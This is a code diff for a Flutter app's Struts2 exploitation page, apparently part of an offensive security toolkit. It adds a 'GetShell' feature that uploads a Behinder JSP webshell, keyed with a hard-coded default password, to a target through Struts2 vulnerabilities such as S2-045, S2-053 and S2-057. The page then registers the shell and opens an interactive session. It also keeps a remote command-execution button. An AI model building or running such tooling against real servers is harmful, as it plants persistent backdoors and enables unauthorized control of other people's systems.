@@ -1,8 +1,15 @@
-import 'package:flutter/material.dart';
-import 'package:flutter/services.dart' show Clipboard, ClipboardData;
+import 'dart:convert';
 
+import 'package:crypto/crypto.dart';
+import 'package:flutter/material.dart';
+import 'package:flutter/services.dart' show Clipboard, ClipboardData, rootBundle;
+
+import '../../database/database_helper.dart';
 import '../../exp/vulhub/struts2_exp_service.dart';
+import '../../models/project.dart';
+import '../../models/webshell.dart';
 import '../../theme/app_theme.dart';
+import '../webshell_interactive_page.dart';
 
 class Struts2ExpPage extends StatelessWidget {
   const Struts2ExpPage({super.key});
@@ -58,6 +65,7 @@ class _Struts2CardState extends State<_Struts2Card> {
   final _timeoutCtrl = TextEditingController();
   final _pathCtrl = TextEditingController(text: 'struts2-showcase');
   final _logScroll = ScrollController();
+  final _passwordCtrl = TextEditingController(text: 'mAtrix_911');
 
   Struts2VulnType _selected = Struts2VulnType.s2045;
   String _log = '';
@@ -113,7 +121,9 @@ class _Struts2CardState extends State<_Struts2Card> {
       final path = _pathCtrl.text.trim();
       for (final t in Struts2VulnType.values) {
         _appendLog('[*] 检测 ${t.label}...');
-        final r = await svc.checkSingle(t, path: path);
+        // S2-053 固定使用 hello.action 路径，不受路径框影响
+        final effectivePath = t == Struts2VulnType.s2053 ? 'hello.action' : path;
+        final r = await svc.checkSingle(t, path: effectivePath);
         if (r.vulnerable) {
           _appendLog('[+] ${r.vulnName}: ${r.detail}');
         } else {
@@ -147,10 +157,150 @@ class _Struts2CardState extends State<_Struts2Card> {
     }
   }
 
+  Future<void> _getShell() async {
+    final url = _urlCtrl.text.trim();
+    if (url.isEmpty) { _appendLog('[!] 请输入目标 URL'); return; }
+    setState(() => _running = true);
+    _appendLog('[*] GetShell (${_selected.label})...');
+    try {
+      final password = _passwordCtrl.text.trim().isEmpty ? 'mAtrix_911' : _passwordCtrl.text.trim();
+      var shellContent = await rootBundle.loadString('assets/defaults/payloads/jsp_behinder.jsp');
+      final key = md5.convert(utf8.encode(password)).toString().substring(0, 16);
+      shellContent = shellContent.replaceFirst(RegExp(r'String k="[0-9a-f]{16}"'), 'String k="$key"');
+      final shellUrl = await _svc().getShell(
+        _selected,
+        shellContent,
+        path: _pathCtrl.text.trim(),
+        onLog: _appendLog,
+      );
+      if (shellUrl != null && mounted) {
+        await _openWebshellFromResult(context, shellUrl, password);
+      }
+    } catch (e) {
+      _appendLog('[!] 异常: $e');
+    } finally {
+      if (mounted) setState(() => _running = false);
+    }
+  }
+
+  Future<void> _openWebshellFromResult(BuildContext context, String shellUrl, String password) async {
+    final now = DateTime.now();
+    Webshell ws = Webshell(
+      id: 0, projectId: 0,
+      name: 'Struts2 GetShell',
+      url: shellUrl,
+      password: password,
+      type: 'jsp',
+      method: 'POST',
+      status: 1,
+      connectorType: 'jsp_behinder',
+      createdAt: now,
+      updatedAt: now,
+    );
+    try {
+      final db = DatabaseHelper();
+      final project = await _showProjectPicker(context, db);
+      if (project != null) {
+        ws = await db.createWebshell(
+          project.id,
+          name: 'Struts2 GetShell',
+          url: shellUrl,
+          password: password,
+          method: 'POST',
+          type: 'jsp',
+          connectorType: 'jsp_behinder',
+        );
+      }
+    } catch (_) {}
+    if (!mounted) return;
+    Navigator.of(context).push(MaterialPageRoute(
+      builder: (_) => WebshellInteractivePage(webshell: ws),
+    ));
+  }
+
+  Future<Project?> _showProjectPicker(BuildContext context, DatabaseHelper db) async {
+    final projects = await db.getAllProjects();
+    if (projects.isEmpty) return _showCreateProjectDialog(context, db);
+    return showDialog<Project>(
+      context: context,
+      builder: (ctx) => AlertDialog(
+        backgroundColor: AppColors.bgCard,
+        title: Text('选择项目', style: AppTextStyles.heading(color: AppColors.primary)),
+        content: SizedBox(
+          width: 320,
+          child: ListView.builder(
+            shrinkWrap: true,
+            itemCount: projects.length,
+            itemBuilder: (_, i) => ListTile(
+              title: Text(projects[i].name, style: AppTextStyles.body(color: AppColors.textPrimary)),
+              subtitle: Text(projects[i].domain, style: AppTextStyles.caption(color: AppColors.textSecondary)),
+              onTap: () => Navigator.pop(ctx, projects[i]),
+            ),
+          ),
+        ),
+        actions: [
+          TextButton(
+            onPressed: () => Navigator.pop(ctx),
+            child: Text('跳过', style: AppTextStyles.body(color: AppColors.textSecondary)),
+          ),
+        ],
+      ),
+    );
+  }
+
+  Future<Project?> _showCreateProjectDialog(BuildContext context, DatabaseHelper db) async {
+    final nameCtrl = TextEditingController();
+    final domainCtrl = TextEditingController();
+    final ok = await showDialog<bool>(
+      context: context,
+      builder: (ctx) => AlertDialog(
+        backgroundColor: AppColors.bgCard,
+        title: Text('暂无项目', style: AppTextStyles.heading(color: AppColors.primary)),
+        content: SizedBox(
+          width: 360,
+          child: Column(mainAxisSize: MainAxisSize.min, crossAxisAlignment: CrossAxisAlignment.stretch, children: [
+            Text('请先创建一个项目以保存 Webshell', style: AppTextStyles.caption(color: AppColors.textSecondary)),
+            const SizedBox(height: 16),
+            TextField(controller: nameCtrl, autofocus: true,
+              style: const TextStyle(color: AppColors.textPrimary),
+              decoration: InputDecoration(labelText: '项目名称', hintText: '例如：目标站点',
+                hintStyle: AppTextStyles.caption(size: 11, color: AppColors.textMuted),
+                labelStyle: const TextStyle(color: AppColors.textSecondary),
+                enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: AppColors.primary.withValues(alpha: 0.5))),
+                focusedBorder: const OutlineInputBorder(borderSide: BorderSide(color: AppColors.primary)))),
+            const SizedBox(height: 12),
+            TextField(controller: domainCtrl,
+              style: const TextStyle(color: AppColors.textPrimary),
+              decoration: InputDecoration(labelText: '域名或ID *', hintText: '例如：example.com',
+                hintStyle: AppTextStyles.caption(size: 11, color: AppColors.textMuted),
+                labelStyle: const TextStyle(color: AppColors.textSecondary),
+                enabledBorder: OutlineInputBorder(borderSide: BorderSide(color: AppColors.primary.withValues(alpha: 0.5))),
+                focusedBorder: const OutlineInputBorder(borderSide: BorderSide(color: AppColors.primary)))),
+          ]),
+        ),
+        actions: [
+          TextButton(onPressed: () => Navigator.pop(ctx, false),
+            child: Text('取消', style: AppTextStyles.body(color: AppColors.textSecondary))),
+          FilledButton(
+            onPressed: () {
+              if (nameCtrl.text.trim().isEmpty || domainCtrl.text.trim().isEmpty) return;
+              Navigator.pop(ctx, true);
+            },
+            style: FilledButton.styleFrom(backgroundColor: AppColors.primary),
+            child: Text('创建', style: AppTextStyles.body(color: AppColors.bgDark))),
+        ],
+      ),
+    );
+    if (ok == true && nameCtrl.text.trim().isNotEmpty && domainCtrl.text.trim().isNotEmpty) {
+      return db.createProject(nameCtrl.text.trim(), domain: domainCtrl.text.trim());
+    }
+    return null;
+  }
+
   @override
   void dispose() {
     _urlCtrl.dispose(); _cmdCtrl.dispose(); _timeoutCtrl.dispose();
-    _pathCtrl.dispose(); _logScroll.dispose();
+    _pathCtrl.dispose(); _logScroll.dispose(); _passwordCtrl.dispose();
     super.dispose();
   }
 
@@ -170,7 +320,7 @@ class _Struts2CardState extends State<_Struts2Card> {
             const SizedBox(height: 8),
             _tf(_timeoutCtrl, '超时(s)', '10', type: TextInputType.number),
             const SizedBox(height: 8),
-            _tf(_pathCtrl, 'S2-057 路径', 'struts2-showcase'),
+            _tf(_pathCtrl, 'S2-053/057 路径', 'struts2-showcase / hello'),
             const SizedBox(height: 16),
             _sectionTitle('漏洞选择'),
             DropdownButtonFormField<Struts2VulnType>(
@@ -181,20 +331,33 @@ class _Struts2CardState extends State<_Struts2Card> {
               items: Struts2VulnType.values
                   .map((t) => DropdownMenuItem(value: t, child: Text(t.label, overflow: TextOverflow.ellipsis)))
                   .toList(),
-              onChanged: _running ? null : (t) => t != null ? setState(() => _selected = t) : null,
+              onChanged: _running ? null : (t) {
+                if (t == null) return;
+                setState(() => _selected = t);
+                if (t == Struts2VulnType.s2053) {
+                  _pathCtrl.text = 'hello.action';
+                } else if (t == Struts2VulnType.s2057) {
+                  _pathCtrl.text = 'struts2-showcase';
+                }
+              },
               decoration: _inputDec('CVE', ''),
             ),
             const SizedBox(height: 8),
             Row(children: [
-              _btn('检测', _check),
+              _btn('检测', _running ? null : _check),
               const SizedBox(width: 8),
-              _btn('检测全部', _checkAll),
+              _btn('检测全部', _running ? null : _checkAll),
             ]),
             const SizedBox(height: 16),
             _sectionTitle('命令执行'),
             _tf(_cmdCtrl, '命令', 'id'),
             const SizedBox(height: 8),
-            _btn('执行命令', _execRce),
+            _btn('执行命令', _running ? null : _execRce),
+            const SizedBox(height: 16),
+            _sectionTitle('GetShell'),
+            _tf(_passwordCtrl, '冰蝎密码', 'mAtrix_911'),
+            const SizedBox(height: 8),
+            _btn('GetShell (写入冰蝎 JSP)', _running ? null : _getShell),
           ],
         ),
       ),
